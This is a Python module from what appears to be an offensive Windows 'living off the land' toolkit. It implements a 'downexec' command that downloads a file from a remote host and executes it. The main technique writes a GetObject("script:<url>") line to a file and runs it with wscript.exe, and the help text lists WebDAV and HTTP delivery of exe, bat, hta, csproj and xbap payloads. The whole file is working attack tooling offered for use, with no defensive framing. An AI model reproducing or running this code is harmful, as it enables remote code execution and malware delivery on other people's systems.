from command import Command
import pathlib
import os
from download import Download
from execute import Execute

class Downexec(Command):

	__options = [	
					"wscript.exe"
				]
	__execution = [	
					"echo GetObject(\"script:?i\") > ?o && wscript.exe ?o"
				  ]
	__fileType = [	
					["vbs","js"]
				 ]
	__protocol = [	
					["http"]
				 ]

	def __init__(self):

		super().__init__(self.__options, self.__execution)

	def printMessage(self):

		print("Working...") 

	def printHelp(self):

		helpstr = """\n Download a file from a remote host and execute it. 
	\n ** USAGE **: downexec <download path> <destination path>
	\n [+] Protocols allowed: Webdav. HTTP can be used to download vbs and js files.
	\n [+] Extensions allowed: Exe, bat, xml, js, vbs, csproj, hta, xbap.
	\n [+] CAUTION: The downloaded file will touch the disk.
		"""

		print(helpstr)


	def checkCompatibility(self, ind, cmdSpl):

		return False

	def downexec(self, cmdSpl):

		d = Download()
		e = Execute()
		d.executeCommand(cmdSpl)
		e.executeCommand(cmdSpl[1:])

	def executeCommand(self, cmdSpl, prevId, nextId, filePath):

		if cmdSpl[0] == 'help':
			self.printHelp()
		else:
			exit = False
			new = ""
			while (self.next < len(self.__options)) and not exit:
				if  not self.__options[self.next].lower().startswith('c:\\'):
					path1 = "c:\windows\system32\\" + self.__options[self.next]
					path2 = "c:\windows\syswow64\\" + self.__options[self.next]
					if pathlib.Path(path1).exists():
						self.exists[self.next] = path1
						if self.checkCompatibility(self.next, cmdSpl):
							exit = True
							new = path1
					elif pathlib.Path(path2).exists():
						self.exists[self.next] = path2
						if self.checkCompatibility(self.next,cmdSpl):
							exit = True
							new = path2
					
				else:
					path = self.__options[self.next]
					if pathlib.Path(path).exists():
						self.exists[self.next] = path
						if self.checkCompatibility(self.next,cmdSpl):
							exit = True
							new = path

				self.next += 1

			if new == "":
				if len(self.exists) > 0:
					a, new = self.selectWithCompatibility(cmdSpl)
					if not a:
						self.downexec(cmdSpl)
						return			
				else:
					self.downexec(cmdSpl)
					return
			else:
				self.printMessage()
				command = self.parseArgs(new, cmdSpl,self.next-1)
				#os.system(command) 
				self.writeCommandInFile(command, prevId, nextId, filePath)